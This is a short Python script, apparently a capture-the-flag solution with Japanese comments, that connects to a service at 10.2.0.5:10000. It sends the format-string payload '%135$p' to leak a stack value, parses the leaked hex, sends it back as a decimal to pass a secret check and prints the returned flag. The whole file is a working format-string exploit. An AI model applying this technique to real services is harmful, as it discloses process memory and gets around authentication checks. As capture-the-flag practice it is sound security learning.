import socket
import time
import re


def solve():
    host = "10.2.0.5"
    port = 10000

    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host, port))

    # 初期のバナーとプロンプトを受信
    # "Exploration: " が表示されるまで読み取るか、単にチャンクを読み取る
    time.sleep(0.5)
    data = s.recv(4096).decode()
    print("Initial Data:", data)

    # 書式指定文字列のペイロードを送信
    payload = "%135$p\n"
    s.send(payload.encode())

    # リークが含まれているはずのレスポンスを受信
    time.sleep(0.5)  # サーバーの処理を待機
    data = s.recv(4096).decode()
    print("Leak Data:", data)

    # リークされた16進数値を解析
    # 内容は "0x........\n...\nEnter the secret..." のようになっているはず
    match = re.search(r"(0x[0-9a-fA-F]+)", data)
    if match:
        hex_val = match.group(1)
        int_val = int(hex_val, 16)
        print(f"Leaked hex: {hex_val}, decimal: {int_val}")

        # 10進数値を送信
        s.send(f"{int_val}\n".encode())

        # フラグを読み取る
        time.sleep(1)
        final_data = s.recv(4096).decode()
        print("Final output:", final_data)
    else:
        print("Failed to parse leak")

    s.close()


if __name__ == "__main__":
    solve()
